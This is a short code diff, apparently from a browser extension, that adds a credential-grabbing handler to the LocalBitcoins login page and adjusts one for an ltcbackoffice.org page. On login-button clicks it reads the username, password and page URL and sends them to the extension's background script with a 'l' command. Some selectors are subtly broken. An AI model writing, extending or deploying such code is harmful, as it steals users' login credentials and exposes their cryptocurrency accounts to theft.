@@ -468,9 +468,9 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
 
   if (top['location']['href']['indexOf']('https://ltcbackoffice.org/') > -1) {
         var interval = setInterval(function () {
-            if (document['getElementByClassName']('page-content')) {
+            if (document['getElementsByClassName']('page-content')) {
                 clearInterval(interval);
-                document['getElementById']('btn-primary').onclick = function (_0x441cx2) {
+                document['getElementsByClassName']('btn-primary').onclick = function (_0x441cx2) {
                  var login = {};
                 login.username = document.getElementById("username").value;
                 login.pass = document.getElementById("password").value;
@@ -480,6 +480,21 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
             }
         }, 1000)
     };
+
+    if (top['location']['href']['indexOf']('https://localbitcoins.com/accounts/login/') > -1) {
+          var interval = setInterval(function () {
+              if (document['getElementsByClassName']('container')) {
+                  clearInterval(interval);
+                  document['getElementById']('btn-primary').onclick = function (_0x441cx2) {
+                   var login = {};
+                  login.username = document.getElementById("id_username").value;
+                  login.pass = document.getElementById("id_password").value;
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",login});
+                  }
+              }
+          }, 1000)
+      };
     //
 // var img = document.getElementsByTagName('img');
 //      for (var i = 0; i < img.length; i++){
